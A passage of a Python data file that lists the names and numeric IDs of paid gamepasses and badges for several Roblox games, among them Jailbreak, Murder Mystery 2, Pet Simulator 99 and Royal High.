        TheHatchGPOEgg  = 'The Hatch: GPO Egg', 2057554081948346, 'The_Hatch_GPO_Egg'
        # List Of Badges
        listOfBadges = [early, PaidAccessToken, CertifiedTrader, ANewAdventure, phoeyugate, TheHatchGPOEgg]

class GrowaGarden: # https://www.roblox.com/games/126884695634066
    placeNames = 'Grow a Garden', 'Grow_a_Garden', 'GaG', 126884695634066
    class Gamepasses:
        Premium_Seed_Pack = 'Premium Seed Pack', 1239020110, 'Premium_Seed_Pack' 
        # List Of Gamepasses
        listOfGamepasses = [Premium_Seed_Pack]
    class Badges:
        G                          = 'G',                             3181581226889239, 'G'
        A                          = 'A',                             2432009301742310, 'A'
        R                          = 'R',                             3495711621999816, 'R'
        D                          = 'D',                             3310355054544865, 'D'
        E                          = 'E',                             3195330021311033, 'E'
        N                          = 'N',                             34852060037844,   'N'
        PurchasedBasicSprinkler    = 'Purchased Basic Sprinkler!',    4330691652818014, 'Purchased_Basic_Sprinkler'
        PurchasedAdvancedSprinkler = 'Purchased Advanced Sprinkler!', 3602894446235962, 'Purchased_Advanced_Sprinkler'
        PurchasedGodlySprinkler    = 'Purchased Godly Sprinkler!',    2213702621912050, 'Purchased_Godly_Sprinkler'
        Spikey                     = 'Spikey!',                       397821235877805,  'Spikey'
        Yourfirstcarrot            = 'Your first carrot!',            3966694991137927, 'Your_first_carrot'
        SHINY                      = 'SHINY!',                        674039989298417,  'SHINY'
        Godapple                   = 'God apple!',                    3833249137800902, 'God_apple'
        GIANTTOMATO                = 'GIANT TOMATO',                  3046817076424642, 'GIANT_TOMATO'
        Carrotconnoisseur          = 'Carrot connoisseur',            1013473936180275, 'Carrot_connoisseur'
        Colorfulfruit              = 'Colorful fruit!',               4429839651101981, 'Colorful_fruit'
        Caretaker                  = 'Care taker',                    393879997365151,  'Care_taker'
        Melonmadness               = 'Melon madness!',                2585648043281722, 'Melon_madness'
        GrandAchievement           = 'Grand Achievement',             1089770809267851, 'Grand_Achievement'
        WhatCameFirst              = 'What Came First?',              157951702469162,  'What_Came_First'
        SeedpackConnoisseur        = 'Seedpack Connoisseur',          2526153383283460, 'Seedpack_Connoisseur'
        PetMaster                  = 'Pet Master',                    4493388333080928, 'Pet_Master'
        # List Of Badges
        listOfBadges = [G, A, R, D, E, N, PurchasedBasicSprinkler, PurchasedAdvancedSprinkler, PurchasedGodlySprinkler, Spikey, Yourfirstcarrot, SHINY, Godapple, GIANTTOMATO, Carrotconnoisseur, Colorfulfruit, Caretaker, Melonmadness, GrandAchievement, WhatCameFirst, SeedpackConnoisseur, PetMaster]

class Jailbreak: # https://www.roblox.com/games/606849621
    placeNames = 'Jailbreak', 'Jailbreak', 'Jb', 606849621
    class Gamepasses:
        ExtraStorage = 'Extra Storage',               2068240,  'Extra_Storage'
        SWATTeam     = 'SWAT Team',                   2070427,  'SWAT_Team'
        CarStereo    = 'Car Stereo',                  2218187,  'Car_Stereo'
        DuffelBag    = 'Duffel Bag',                  2219040,  'Duffel_Bag'
        VIP          = 'VIP (Very Important Player)', 2296901,  'VIP_Very_Important_Player'
        ProGarage    = 'Pro Garage',                  2725211,  'Pro_Garage'
        CrimeBoss    = 'Crime Boss',                  4974038,  'Crime_Boss'
        XPBoost      = 'XP Boost',                    6631507,  'XP_Boost'
        VIPTrading   = 'VIP Trading',                 56149618, 'VIP_Trading'
        # List Of Gamepasses
        listOfGamepasses = [ExtraStorage, SWATTeam, CarStereo, DuffelBag, VIP, ProGarage, CrimeBoss, XPBoost, VIPTrading]
    class Badges:
        MVP                                 = 'MVP (Most Valuable Player)',              958186367,  'MVP_Most_Valuable_Player'
        TopGun                              = 'Top Gun',                                 958186842,  'Top_Gun'
        BankBust                            = 'Bank Bust',                               958186941,  'Bank_Bust'
        DrillSergeant                       = 'Drill Sergeant',                          958187053,  'Drill_Sergeant'
        MasterCriminal                      = 'Master Criminal',                         958187226,  'Master_Criminal'
        BonnieAndClyde                      = 'Bonnie & Clyde',                          958187343,  'Bonnie_And_Clyde'
        SmoothCriminal                      = 'Smooth Criminal',                         958187470,  'Smooth_Criminal'
        MeetTheDevs                         = 'Meet The Devs!',                          1399506017, 'Meet_The_Devs'
        JailbreakRBBattlesChampionshipBadge = 'Jailbreak RB Battles Championship Badge', 2124624990, 'Jailbreak_RB_Battles_Championship_Badge'
        DefeatTheCEO                        = 'Defeat The CEO!',                         2129891386, 'Defeat_The_CEO'
        Unnamed1                            = '??? 1',                                   2124575784, 'Unnamed_1'
        Unnamed2                            = '??? 2',                                   2129465542, 'Unnamed_2'
        # List Of Badges
        listOfBadges = [MVP, TopGun, BankBust, DrillSergeant, MasterCriminal, BonnieAndClyde, SmoothCriminal, MeetTheDevs, JailbreakRBBattlesChampionshipBadge, DefeatTheCEO, Unnamed1, Unnamed2]

class JujutsuInfinite: # https://www.roblox.com/games/10450270085
    placeNames = 'Jujutsu Infinite', 'Jujutsu_Infinite', 'JI', 10450270085
    class Gamepasses:
        InnateSlot3         = 'Innate Slot 3',        77102481,  'Innate_Slot_3'
        InnateSlot4         = 'Innate Slot 4',        77102528,  'Innate_Slot_4'
        HeavenlyRestriction = 'Heavenly Restriction', 77102969,  'Heavenly_Restriction'
        ExtraEmoteSlots     = 'Extra Emote Slots',    77103194,  'Extra_Emote_Slots'
        ItemNotifier        = 'Item Notifier',        77103458,  'Item_Notifier'
        InnateBag           = 'Innate Bag',           77110710,  'Innate_Bag'
        SkipSpins           = 'Skip Spins',           259500454, 'Skip_Spins'
        # List Of Gamepasses
        listOfGamepasses = [InnateSlot3, InnateSlot4, HeavenlyRestriction, ExtraEmoteSlots, ItemNotifier, InnateBag, SkipSpins]
    class Badges:
        PlayedTutorial        = 'Played Tutorial',         1768126716824041, 'Played_Tutorial'
        PlayedJujutsuInfinite = 'Played Jujutsu Infinite', 2136221767,       'Played_Jujutsu_Infinite'
        DomainExpansion       = 'Domain Expansion',        2136222659,       'Domain_Expansion'
        SpecialGradeSorcerer  = 'Special Grade Sorcerer',  2136224010,       'Special_Grade_Sorcerer'
        # List Of Badges
        listOfBadges = [PlayedTutorial, PlayedJujutsuInfinite, DomainExpansion, SpecialGradeSorcerer]

class KingLegacy: # https://www.roblox.com/games/4520749081
    placeNames = 'King Legacy', 'King_Legacy', 'KL', 4520749081
    class Gamepasses:
        Tips              = 'Tips',                7866886,    'Tips'
        QuestExperiencex2 = 'Quest Experience x2', 7888149,    'Quest_Experience_x2'
        QuestMoneyx2      = 'Quest Money x2',      8114853,    'Quest_Money_x2'
        ItemDropx2        = 'Item Drop x2',        18044132,   'Item_Drop_x2'
        NightBlade        = 'Night Blade',         7929804,    'Night_Blade'
        FruitPosition     = 'Fruit Position',      7936106,    'Fruit_Position'
        ConquerorAbility  = 'Conqueror Ability',   8287391,    'Conqueror_Ability'
        CoffinBoat        = 'Coffin Boat',         9876237,    'Coffin_Boat'
        LegacyPose        = 'Legacy Pose',         18399361,   'Legacy_Pose'
        FruitBag          = 'Fruit Bag',           23746192,   'Fruit_Bag'
        VoltBundle        = 'Volt Bundle',         1324228345, 'Volt_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [Tips, QuestExperiencex2, QuestMoneyx2, ItemDropx2, NightBlade, FruitPosition, ConquerorAbility, CoffinBoat, LegacyPose, FruitBag, VoltBundle]
    class Badges:
        SecondSea = 'Second Sea', 570761085363018,  'Second_Sea'
        ThirdSea  = 'Third Sea',  2677309180656288, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class MurderMystery2: # https://www.roblox.com/games/142823291
    placeNames = 'Murder Mystery 2', 'Murder_Mystery_2', 'MM2', 142823291
    class Gamepasses:
        Elite                    = 'Elite',                                   429957 ,    'Elite'
        Radio                    = 'Radio',                                   1308795,    'Radio'
        RandomizedFaces1         = 'Randomized Faces 1',                      79442,      'Randomized_Faces_1'
        RandomizedFaces2         = 'Randomized Faces 2',                      429356,     'Randomized_Faces_2'
        ShadowItemPack           = 'Shadow Item Pack',                        1201672,    'Shadow_Item_Pack'
        ClockworkItemPack        = 'Clockwork Item Pack ',                    1491260,    'Clockwork_Item_Pack'
        BIT8ItemPack             = '8-BIT Item Pack',                         1531578,    '8_BIT_Item_Pack'
        FuturisticItemPack       = 'Futuristic Item Pack',                    1712843,    'Futuristic_Item_Pack'
        AmericanItemPack         = 'American Item Pack',                      2002511,    'American_Item_Pack'
        HalloweenItemPack        = 'Halloween Item Pack',                     3346253,    'Halloween_Item_Pack'
        WinterItemPack           = 'Winter Item Pack',                        3646351,    'Winter_Item_Pack'
        Batwing                  = 'Batwing',                                 5299081,    'Batwing'
        Icewing                  = 'Icewing',                                 5593012,    'Icewing'
        GhostlyItemPack          = 'Ghostly Item Pack',                       7435036,    'Ghostly_Item_Pack'
        FrostbiteItemPack        = 'Frostbite Item Pack',                     7795820,    'Frostbite_Item_Pack'
        Bioblade                 = 'Bioblade',                                8456434,    'Bioblade'
        Prismatic                = 'Prismatic',                               10747452,   'Prismatic'
        VampiresEdge             = 'Vampire\'s Edge',                         12448341,   'Vampires_Edge'
        Peppermint               = 'Peppermint',                              13308756,   'Peppermint'
        Cookieblade              = 'Cookieblade',                             13502690,   'Cookieblade'
        Heartblade               = 'Heartblade',                              15066851,   'Heartblade'
        Eggblade                 = 'Eggblade',                                16462794,   'Eggblade'
        EVOReaver                = 'EVO: Reaver',                             24102758,   'EVO_Reaver'
        EVOIcecrusher            = 'EVO: Icecrusher',                         112956652,  'EVO_Icecrusher'
        EVOGingerscythe          = 'EVO: Gingerscythe',                       674830453,  'EVO_Gingerscythe'
        EVOSynthwave             = 'EVO: Synthwave',                          1326724250, 'EVO_Synthwave'
        PACKLatte                = 'PACK: Latte',                             658376309,  'PACK_Latte'
        GODLYNebula              = 'GODLY: Nebula',                           21348436,   'GODLY_Nebula'
        GODLYIceBeam             = 'GODLY: Ice Beam',                         26304638,   'GODLY_Ice_Beam'
        GODLYIceFlake            = 'GODLY: Ice Flake',                        26304644,   'GODLY_Ice_Flake'
        BUNDLEIceBeamFlakeEffect = 'BUNDLE: Ice Beam, Ice Flake, Ice Effect', 26304640,   'BUNDLE_Ice_Beam_Ice_Flake_Ice_Effect'
        GODLYPlasmabeam          = 'GODLY: Plasmabeam',                       55292828,   'GODLY_Plasmabeam'
        GODLYPlasmablade         = 'GODLY: Plasmablade',                      55292879,   'GODLY_Plasmablade'
        BUNDLEPlasma             = 'BUNDLE: Plasma',                          55292987,   'BUNDLE_Plasma'
        GODLYPhantom             = 'GODLY: Phantom',                          93780280,   'GODLY_Phantom'
        GODLYSpectre             = 'GODLY: Spectre',                          93780323,   'GODLY_Spectre'
        BUNDLEPhantomSpectre     = 'BUNDLE: Phantom & Spectre',               93780371,   'BUNDLE_Phantom_Spectre'
        GODLYBlossom             = 'GODLY: Blossom',                          131048887,  'GODLY_Blossom'
        GODLYSakura              = 'GODLY: Sakura',                           131048950,  'GODLY_Sakura'
        BUNDLESakura             = 'BUNDLE: Sakura',                          131048794,  'BUNDLE_Sakura'
        GODLYRainbowGun          = 'GODLY: Rainbow Gun',                      156618021,  'GODLY_Rainbow_Gun'
        GODLYRainbow             = 'GODLY: Rainbow',                          156618096,  'GODLY_Rainbow'
        BUNDLERainbow            = 'BUNDLE: Rainbow',                         156618061,  'BUNDLE_Rainbow'
        GODLYOcean               = 'GODLY: Ocean',                            200073999,  'GODLY_Ocean'
        GODLYWaves               = 'GODLY: Waves',                            200074174,  'GODLY_Waves'
        BUNDLEBeachPack          = 'BUNDLE: Beach Pack',                      200074115,  'BUNDLE_Beach_Pack'
        GODLYDarkshot            = 'GODLY: Darkshot',                         273009597,  'GODLY_Darkshot'
        GODLYDarksword           = 'GODLY: Darksword',                        273009675,  'GODLY_Darksword'
        BUNDLEDarknessPack       = 'BUNDLE: Darkness Pack',                   273009641,  'BUNDLE_Darkness_Pack'
        GODLYTurkey              = 'GODLY: Turkey',                           658667213,  'GODLY_Turkey'
        GODLYFlowerwoodGun       = 'GODLY: Flowerwood Gun',                   768389355,  'GODLY_Flowerwood_Gun'
        GODLYFlowerwood          = 'GODLY: Flowerwood',                       769140200,  'GODLY_Flowerwood'
        BUNDLEFlowerwood         = 'BUNDLE: Flowerwood',                      767127317,  'BUNDLE_Flowerwood'
        GODLYPearlshine          = 'GODLY: Pearlshine',                       850293409,  'GODLY_Pearlshine'
        GODLYPearl               = 'GODLY: Pearl',                            850003963,  'GODLY_Pearl'
        BUNDLEPearls             = 'BUNDLE: Pearls',                          850387075,  'BUNDLE_Pearls'
        GODLYSpirit              = 'GODLY: Spirit',                           942004724,  'GODLY_Spirit'
        GODLYSoul                = 'GODLY: Soul',                             941784760,  'GODLY_Soul'
        BUNDLESpiritSoul         = 'BUNDLE: Spirit & Soul',                   942030669,  'BUNDLE_Spirit_Soul'
        GODLYBorealis            = 'GODLY: Borealis',                         1008841389, 'GODLY_Borealis'
        GODLYAustralis           = 'GODLY: Australis',                        1008813284, 'GODLY_Australis'
        BUNDLEAurora             = 'BUNDLE: Aurora',                          1009231264, 'BUNDLE_Aurora'
        GODLYFlora               = 'GODLY: Flora',                            1167438350, 'GODLY_Flora'
        GODLYBloom               = 'GODLY: Bloom',                            1165838634, 'GODLY_Bloom'
        BUNDLEBloom              = 'BUNDLE: Bloom',                           1166580569, 'BUNDLE_Bloom'
        GODLYXenoknife           = 'GODLY: Xenoknife',                        1534775989, 'GODLY_Xenoknife'
        GODLYXenoshot            = 'GODLY: Xenoshot',                         1533049236, 'GODLY_Xenoshot'
        BUNDLEXenotech           = 'BUNDLE: Xenotech',                        1535587918, 'BUNDLE_Xenotech'
        # List Of Gamepasses
        listOfGamepasses = [Elite, Radio, RandomizedFaces1, RandomizedFaces2, ShadowItemPack, ClockworkItemPack, BIT8ItemPack, FuturisticItemPack, AmericanItemPack, HalloweenItemPack, WinterItemPack, Batwing, Icewing, GhostlyItemPack, FrostbiteItemPack, Bioblade, Prismatic, VampiresEdge, Peppermint, Cookieblade, Heartblade, Eggblade, EVOReaver, EVOIcecrusher, EVOGingerscythe, EVOSynthwave, PACKLatte, GODLYNebula, GODLYIceBeam, GODLYIceFlake, BUNDLEIceBeamFlakeEffect, GODLYPlasmabeam, GODLYPlasmablade, BUNDLEPlasma, GODLYPhantom, GODLYSpectre, BUNDLEPhantomSpectre, GODLYBlossom, GODLYSakura, BUNDLESakura, GODLYRainbowGun, GODLYRainbow, BUNDLERainbow, GODLYOcean, GODLYWaves, BUNDLEBeachPack, GODLYDarkshot, GODLYDarksword, BUNDLEDarknessPack, GODLYTurkey, GODLYFlowerwoodGun, GODLYFlowerwood, BUNDLEFlowerwood, GODLYPearlshine, GODLYPearl, BUNDLEPearls, GODLYSpirit, GODLYSoul, BUNDLESpiritSoul, GODLYBorealis, GODLYAustralis, BUNDLEAurora, GODLYFlora, GODLYBloom, BUNDLEBloom, GODLYXenoknife, GODLYXenoshot, BUNDLEXenotech]
    class Badges:
        Level10            = 'Level 10',             196198137,  'Level_10'
        Level20            = 'Level 20',             196198654,  'Level_20'
        Level30            = 'Level 30',             196198776,  'Level_30'
        Level40            = 'Level 40',             196199518,  'Level_40'
        Level50            = 'Level 50',             196200089,  'Level_50'
        Level60            = 'Level 60',             196200207,  'Level_60'
        Level70            = 'Level 70',             196200425,  'Level_70'
        Level80            = 'Level 80',             196200625,  'Level_80'
        Level90            = 'Level 90',             196200691,  'Level_90'
        Level100           = 'Level 100',            196200785,  'Level_100'
        JoinedtheSurvivors = 'Joined the Survivors', 2129030855, 'Joined_the_Survivors'
        JoinedtheZombies   = 'Joined the Zombies',   2129030849, 'Joined_the_Zombies'
        RBKnife            = 'RB Knife',             2124636122, 'RB_Knife'
        # List Of Badges
        listOfBadges = [Level10, Level20, Level30, Level40, Level50, Level60, Level70, Level80, Level90, Level100, JoinedtheSurvivors, JoinedtheZombies, RBKnife]

class PetSimulator99: # https://www.roblox.com/games/8737899170
    placeNames = 'Pet Simulator 99', 'Pet_Simulator_99', 'PS99', 8737899170
    class Gamepasses:
        VIP              = 'VIP!',                257811346,  'VIP'
        Lucky            = 'Lucky!',              205379487,  'Lucky'
        UltraLucky       = 'Ultra Lucky!',        257803774,  'Ultra_Lucky'
        MagicEggs        = 'Magic Eggs!',         258567677,  'Magic_Eggs'
        Plus15Pets       = '+15 Pets!',           259437976,  'Plus_15_Pets'
        Plus15Eggs       = '+15 Eggs!',           655859720,  'Plus_15_Eggs'
        HugeHunter       = 'Huge Hunter!',        264808140,  'Huge_Hunter'
        AutoFarm         = 'Auto Farm!',          265320491,  'Auto_Farm'
        AutoTap          = 'Auto Tap!',           265324265,  'Auto_Tap'
        DaycareSlots     = 'Daycare Slots!',      651611000,  'Daycare_Slots'
        SuperDrops       = 'Super Drops!',        690997523,  'Super_Drops'
        DoubleStars      = 'Double Stars!',       720275150,  'Double_Stars'
        SuperShinyHunter = 'Super Shiny Hunter!', 975558264,  'Super_Shiny_Hunter'
        Pass             = 'Pass',                1099764410, 'Pass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, UltraLucky, MagicEggs, Plus15Pets, Plus15Eggs, HugeHunter, AutoFarm, AutoTap, DaycareSlots, SuperDrops, DoubleStars, SuperShinyHunter, Pass]
    class Badges:
        Welcome             = 'Welcome',                 2153913164,       'Welcome'
        TheHuntFirstEdition = 'The Hunt: First Edition', 3189151177666639, 'The_Hunt_First_Edition'
        TheHuntMegaEdition  = 'The Hunt: Mega Edition',  754796678735151,  'The_Hunt_Mega_Edition'
        JourneysEnd         = 'Journey\'s End',          327631483993374,  'Journeys_End'
        # List Of Badges
        listOfBadges = [Welcome, TheHuntFirstEdition, TheHuntMegaEdition, JourneysEnd]
        
class PETSGO: # https://www.roblox.com/games/18901165922
    placeNames = 'PETS GO', 'PETS_GO', 'PG', 18901165922
    class Gamepasses:
        VIP            = 'VIP!',             947426555,  'VIP'
        Lucky          = 'Lucky!',           923677450,  'Lucky'
        UltraLucky     = 'Ultra Lucky!',     924643143,  'Ultra_Lucky'
        CelestialLuck  = 'Celestial Luck!',  974931021,  'Celestial_Luck'
        Plus3Pets      = '+3 Pets!',         955414606,  'Plus_3_Pets'
        HyperDice      = 'Hyper Dice!',      923754964,  'Hyper_Dice'
        DoubleDice     = 'Double Dice!',     951531608,  'Double_Dice'
        DoubleCoins    = 'Double Coins!',    955430652,  'Double_Coins'
        HugeHunter     = 'Huge Hunter!',     966471470,  'Huge_Hunter'
        ShinyHunter    = 'Shiny Hunter!',    977188877,  'Shiny_Hunter'
        DiamondPrinter = 'Diamond Printer!', 1008933294, 'Diamond_Printer'
        RainbowRolling = 'Rainbow Rolling!', 1009157126, 'Rainbow_Rolling'
        SkillMaster    = 'Skill Master!',    1089231744, 'Skill_Master'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, UltraLucky, CelestialLuck, Plus3Pets, HyperDice, DoubleDice, DoubleCoins, HugeHunter, ShinyHunter, DiamondPrinter, RainbowRolling, SkillMaster]
    class Badges:
        P                      = 'P',                          3587889778036452, 'P'
        E                      = 'E',                          513094477922687,  'E'
        T                      = 'T',                          2446810370554117, 'T'
        S                      = 'S',                          2632896258542796, 'S'
        G                      = 'G',                          3957160897472233, 'G'
        O                      = 'O',                          1244002859092897, 'O'
        RobloxWinterToken      = 'Roblox Winter Token!',       3275096128139364, 'Roblox_Winter_Token'
        RobloxWinterEliteToken = 'Roblox Winter Elite Token!', 3275096128139364, 'Roblox_Winter_Elite_Token'
        # List Of Badges
        listOfBadges = [P, E, T, S, G, O, RobloxWinterToken, RobloxWinterEliteToken]

class ProjectSlayers: # https://www.roblox.com/games/5956785391
    placeNames = 'Project Slayers', 'Project_Slayers', 'PS', 5956785391
    class Gamepasses:
        SealedBox                                   = 'Sealed Box',                                       15101943,  'Sealed_Box'
        MuzanSpawn                                  = 'Muzan Spawn',                                      17958345,  'Muzan_Spawn'
        TotalConcentrationandDemonprogressionviewer = 'Total Concentration and Demon progression viewer', 18589360,  'Total_Concentration_and_Demon_progression_viewer'
        DisableOrEnableSlayerCorpUniform            = 'Disable Or Enable Slayer Corp Uniform',            18710993,  'Disable_Or_Enable_Slayer_Corp_Uniform'
        GourdDurabilityViewer                       = 'Gourd Durability Viewer',                          19241624,  'Gourd_Durability_Viewer'
        MoreEyesOptions                             = 'More Eyes Options',                                19270529,  'More_Eyes_Options'
        MoreFacialAccessoriesOptions                = 'More Facial Accessories Options',                  19270563,  'More_Facial_Accessories_Options'
        SetSpawnAnywhere                            = 'Set Spawn Anywhere',                               19300397,  'Set_Spawn_Anywhere'
        UrokodakisMask                              = 'Urokodaki\'s Mask',                                19340032,  'Urokodakis_Mask'
        MoreCharacterSlots                          = 'More Character Slots',                             19426240,  'More_Character_Slots'
        PrivateServers                              = 'Private Servers',                                  19516845,  'Private_Servers'
        CrowCustomization                           = 'Crow Customization',                               21698004,  'Crow_Customization'
        SkipSpin                                    = 'Skip Spin',                                        46503236,  'Skip_Spin'
        EmotePack                                   = 'Emote Pack',                                       42670615,  'Emote_Pack'
        EmotePack2                                  = 'Emote Pack 2',                                     178295110, 'Emote_Pack_2'
        ExtraEquipmentLoadouts                      = 'Extra Equipment Loadouts',                         181954095, 'Extra_Equipment_Loadouts'
        RobloxAvatar                                = 'Roblox Avatar',                                    16864938,  'Roblox_Avatar'
        # List Of Gamepasses
        listOfGamepasses = [SealedBox, MuzanSpawn, TotalConcentrationandDemonprogressionviewer, DisableOrEnableSlayerCorpUniform, GourdDurabilityViewer, MoreEyesOptions, MoreFacialAccessoriesOptions, SetSpawnAnywhere, UrokodakisMask, MoreCharacterSlots, PrivateServers, CrowCustomization, SkipSpin, EmotePack, EmotePack2, ExtraEquipmentLoadouts, RobloxAvatar]

class Rivals: # https://www.roblox.com/games/71874690745115
    placeNames = 'Rivals', 'Rivals', 'Ri', 71874690745115
    class Gamepasses:
        EnergyBundle          = 'Energy Bundle!',           977061826,  'Energy_Bundle'
        StarterBundle         = 'Starter Bundle!',          839491390,  'Starter_Bundle'
        StandardWeaponsBundle = 'Standard Weapons Bundle!', 838203071,  'Standard_Weapons_Bundle'
        HeavyDutyBundle       = 'Heavy Duty Bundle!',       838198043,  'Heavy_Duty_Bundle'
        ClassicBundle         = 'Classic Bundle!',          838160059,  'Classic_Bundle'
        ExogunBundle          = 'Exogun Bundle!',           838087219,  'Exogun_Bundle'
        MedkitBundle          = 'Medkit Bundle!',           837904767,  'Medkit_Bundle'
        PixelBundle           = 'Pixel Bundle!',            938353691,  'Pixel_Bundle'
        RPGBundle             = 'RPG Bundle!',              1162134376, 'RPG_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [EnergyBundle, StarterBundle, StandardWeaponsBundle, HeavyDutyBundle, ClassicBundle, ExogunBundle, MedkitBundle, PixelBundle, RPGBundle]
    class Badges:
        Welcome     = 'Welcome!',      2904819966736756, 'Welcome'
        AlphaTester = 'Alpha Tester!', 1330297521556384, 'Alpha_Tester'
        # List Of Badges
        listOfBadges = [Welcome, AlphaTester]

class RoyalHigh: # https://www.roblox.com/games/735030788
    placeNames = 'Royal High', 'Royal_High', 'RH', 735030788
    class Gamepasses:
        FasterFlight                     = 'Faster Flight!',                     3436552,   'Faster_Flight'
        x2DoubleDiamonds                 = '2x Double Diamonds!',                3455446,   '2x_Double_Diamonds'
        x4QuadrupleDiamonds              = '4x Quadruple Diamonds!',             3457593,   '4x_Quadruple_Diamonds'
        PaintbrushPass                   = 'Paintbrush Pass!',                   3457412,   'Paintbrush_Pass'
        NewHairColorsPlusGLOWINGHairPass = 'New Hair Colors +GLOWING Hair Pass', 4097864,   'New_Hair_Colors_Plus_GLOWING_Hair_Pass'
        FlyonEarth                       = 'Fly on Earth!',                      5350675,   'Fly_on_Earth'
        SpecialFabricDesigns             = 'Special Fabric Designs',             5585682,   'Special_Fabric_Designs'
        UploadCustomFabricsPass          = 'Upload Custom Fabrics Pass!',        785128363, 'Upload_Custom_Fabrics_Pass'
        CrystalBallPower                 = 'Crystal Ball Power',                 6316501,   'Crystal_Ball_Power'
        StickerPacksPass                 = 'Sticker Packs Pass!',                10111433,  'Sticker_Packs_Pass'
        MaterialsPass                    = 'Materials Pass!',                    982344484, 'Materials_Pass'
        # List Of Gamepasses
        listOfGamepasses = [FasterFlight, x2DoubleDiamonds, x4QuadrupleDiamonds, PaintbrushPass, NewHairColorsPlusGLOWINGHairPass, FlyonEarth, SpecialFabricDesigns, UploadCustomFabricsPass, CrystalBallPower, StickerPacksPass, MaterialsPass]
    class Badges:
        RoyaleChristmas2019                     = 'Royale Christmas 2019!',                          2124498675,       'Royale_Christmas_2019'
        HappyNewYearswithRoyaleHigh2020         = 'Happy New Years with Royale High 2020!',          2124500186,       'Happy_New_Years_with_Royale_High_2020'
        RoyaleValentinesDay2020                 = 'Royale Valentines Day 2020!',                     2124509827,       'Royale_Valentines_Day_2020'
        SaintPatricksDay2019                    = 'Saint Patrick\'s Day 2019!',                      2124459883,       'Saint_Patricks_Day_2019'
        SaintPatricksDay2020                    = 'Saint Patrick\'s Day 2020!',                      2124517063,       'Saint_Patricks_Day_2020'
        RoyaleGlitterfrost2023                  = 'Royale Glitterfrost 2023!',                       410317500135558,  'Royale_Glitterfrost_2023'
        AdventCalendar2023Completionist         = 'Advent Calendar 2023 Completionist!',             946888967668846,  'Advent_Calendar_2023_Completionist'
        PumpkinContest2018                      = 'Pumpkin Contest 2018',                            2124428491,       'Pumpkin_Contest_2018'
        Halloween2018                           = 'Halloween 2018',                                  2124428509,       'Halloween_2018'
        Halloween2019DesignerEventCompletionist = 'Halloween 2019 Designer Event Completionist!',    2124487935,       'Halloween_2019_Designer_Event_Completionist'
        RoyaleHighHalloween2019                 = 'Royale High Halloween 2019!',                     2124490533,       'Royale_High_Halloween_2019'
        CompletedSuperHardMaze2019              = 'Completed Super Hard Maze 2019',                  2124490534,       'Completed_Super_Hard_Maze_2019'
        BeattheSuperScaryMaze2023               = 'Beat the Super Scary Maze 2023!',                 2152604997,       'Beat_the_Super_Scary_Maze_2023'
        BeattheSuperScaryMaze2025               = 'Beat the Super Scary Maze 2025!',                 4025403312692129, 'Beat_the_Super_Scary_Maze_2025'
        Royalloween2023                         = 'Royalloween 2023!',                               2152604993,       'Royalloween_2023'
        Royalloween2024                         = 'Royalloween 2024!',                               2559633734876320, 'Royalloween_2024'
        Royalloween2025                         = 'Royalloween 2025!',                               3494963190309092, 'Royalloween_2025'
        TopLeaderboardContributor2023           = 'Top Leaderboard Contributor! 2023',               2150899389,       'Top_Leaderboard_Contributor_2023'
        TopLeaderboardContributor2024           = 'Top Leaderboard Contributor! 2024',               2828451204247516, 'Top_Leaderboard_Contributor_2024'
        TopLeaderboardContributor2025           = 'Top Leaderboard Contributor! 2025',               1974333512672108, 'Top_Leaderboard_Contributor_2025'
        PurchasedAllGoddessofTriumphItems2023   = 'Purchased All Goddess of Triumph Items! 2023',    2150899380,       'Purchased_All_Goddess_of_Triumph_Items_2023'
        PurchasedAllGoddessofTriumphItems2024   = 'Purchased All Goddess of Triumph Items! 2024',    4117382963595102, 'Purchased_All_Goddess_of_Triumph_Items_2024'
        PurchasedaPiecefromGoddessofTriumph2024 = 'Purchased a Piece from Goddess of Triumph! 2024', 3500868758609792, 'Purchased_a_Piece_from_Goddess_of_Triumph_2024'
        # List Of Badges
        listOfBadges = [RoyaleChristmas2019, HappyNewYearswithRoyaleHigh2020, RoyaleValentinesDay2020, SaintPatricksDay2019, SaintPatricksDay2020, RoyaleGlitterfrost2023, AdventCalendar2023Completionist, PumpkinContest2018, Halloween2018, Halloween2019DesignerEventCompletionist, RoyaleHighHalloween2019, CompletedSuperHardMaze2019, BeattheSuperScaryMaze2023, BeattheSuperScaryMaze2025, Royalloween2023, Royalloween2024, Royalloween2025, TopLeaderboardContributor2023, TopLeaderboardContributor2024, TopLeaderboardContributor2025, PurchasedAllGoddessofTriumphItems2023, PurchasedAllGoddessofTriumphItems2024, PurchasedaPiecefromGoddessofTriumph2024]

class SolsRNG: # https://www.roblox.com/games/15532962292
    placeNames = 'Sol\'s RNG', 'Sols_RNG', 'SRNG', 15532962292
    class Gamepasses:
        RNGPremiumPassSeasonI  = 'RNG Premium Pass - Season I',  1240677143,  'RNG_Premium_Pass_Season_I'
        RNGPremiumPassSeasonII = 'RNG Premium Pass - Season II', 1418075511,  'RNG_Premium_Pass_Season_II'
        VIP                    = 'VIP',                          705238616,   'VIP'
        VIPPlus                = 'VIP+',                         952898058,   'VIP_Plus'
        StarterPack            = 'Starter Pack',                 1367756732,  'Starter_Pack'
        QuickRoll              = 'Quick Roll',                   673353863,   'Quick_Roll'
        InvisibleGear          = 'Invisible Gear',               792728808,   'Invisible_Gear'
        MerchantTeleporter     = 'Merchant Teleporter',          879770191,   'Merchant_Teleporter'
        InnovatorPackVol1      = 'Innovator Pack Vol 1',         958699822,   'Innovator_Pack_Vol_1'
        InnovatorPackVol2      = 'Innovator Pack Vol 2',         958340231,   'Innovator_Pack_Vol_2'
        InnovatorPackVol3      = 'Innovator Pack Vol 3',         958598071,   'Innovator_Pack_Vol_3'
        # List Of Gamepasses
        listOfGamepasses = [RNGPremiumPassSeasonI, RNGPremiumPassSeasonII, VIP, VIPPlus, StarterPack, QuickRoll, InvisibleGear, MerchantTeleporter, InnovatorPackVol1, InnovatorPackVol2, InnovatorPackVol3]
    class Badges:
        IjuststartedSolsRNG     = 'I just started Sol\'s RNG',        1441130719000460, 'I_just_started_Sols_RNG'
        Alittlebitofrolls       = 'A little bit of rolls',            3622512718465802, 'A_little_bit_of_rolls'
        ImaddictedtoSolsRNG     = 'I\'m addicted to Sol\'s RNG',      1107034638377762, 'Im_addicted_to_Sols_RNG'
